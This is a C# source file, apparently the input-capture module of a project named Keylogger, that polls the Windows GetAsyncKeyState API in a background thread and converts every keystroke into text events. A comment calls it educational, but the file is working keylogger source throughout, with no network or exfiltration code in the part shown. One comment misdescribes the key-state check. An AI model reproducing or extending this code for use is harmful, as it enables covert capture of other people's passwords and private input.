using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Keylogger.Core.InputMonitoring
{
    /// <summary>
    /// Provides monitoring of keyboard input for educational and research purposes
    /// </summary>
    public class KeyboardMonitor
    {
        // Import required Windows API functions
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        // Event for key press detection
        public event EventHandler<KeyPressEventArgs> KeyPressed;

        private volatile bool _isRunning;
        private Thread _monitorThread;

        /// <summary>
        /// Starts the keyboard monitoring process
        /// </summary>
        public void Start()
        {
            if (_isRunning)
                return;
                
            _isRunning = true;
            _monitorThread = new Thread(MonitorKeyboard) { IsBackground = true };
            _monitorThread.Start();
        }

        /// <summary>
        /// Stops the keyboard monitoring process
        /// </summary>
        public void Stop()
        {
            _isRunning = false;
            _monitorThread?.Join(1000);
        }

        /// <summary>
        /// The main monitoring loop that checks for key presses
        /// </summary>
        private void MonitorKeyboard()
        {
            while (_isRunning)
            {
                Thread.Sleep(10); // Small delay to reduce CPU usage

                // Check all key states
                for (int i = 0; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    // Key was pressed since last check (0x8000 = high-order bit set)
                    if ((keyState & 0x8000) != 0)
                    {
                        string keyData = InterpretKeyCode(i);
                        if (!string.IsNullOrEmpty(keyData))
                        {
                            // Raise event with the key information
                            KeyPressed?.Invoke(this, new KeyPressEventArgs(keyData, i));
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Converts virtual key codes to readable text
        /// </summary>
        /// <param name="keyCode">The virtual key code</param>
        /// <returns>Human-readable key representation</returns>
        public static string InterpretKeyCode(int keyCode)
        {
            // Convert virtual key code to readable format
            switch (keyCode)
            {
                case 0x08: return "[Backspace]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\r\n";
                case 0x10: return "[Shift]";
                case 0x11: return "[Ctrl]";
                case 0x12: return "[Alt]";
                case 0x14: return "[CapsLock]";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                // Navigation keys
                case 0x21: return "[PgUp]";
                case 0x22: return "[PgDown]";
                case 0x23: return "[End]";
                case 0x24: return "[Home]";
                case 0x25: return "[Left]";
                case 0x26: return "[Up]";
                case 0x27: return "[Right]";
                case 0x28: return "[Down]";
                case 0x2C: return "[PrtSc]";
                case 0x2D: return "[Insert]";
                case 0x2E: return "[Delete]";
                // Function keys
                case 0x70: return "[F1]";
                case 0x71: return "[F2]";
                case 0x72: return "[F3]";
                case 0x73: return "[F4]";
                case 0x74: return "[F5]";
                case 0x75: return "[F6]";
                case 0x76: return "[F7]";
                case 0x77: return "[F8]";
                case 0x78: return "[F9]";
                case 0x79: return "[F10]";
                case 0x7A: return "[F11]";
                case 0x7B: return "[F12]";
                default:
                    // For standard keys, convert to character
                    return !char.IsControl((char)keyCode) ? ((char)keyCode).ToString() : "";
            }
        }
    }

    /// <summary>
    /// Event arguments for key press events
    /// </summary>
    public class KeyPressEventArgs : EventArgs
    {
        public string KeyText { get; }
        public int VirtualKeyCode { get; }

        public KeyPressEventArgs(string keyText, int virtualKeyCode)
        {
            KeyText = keyText;
            VirtualKeyCode = virtualKeyCode;
        }
    }
}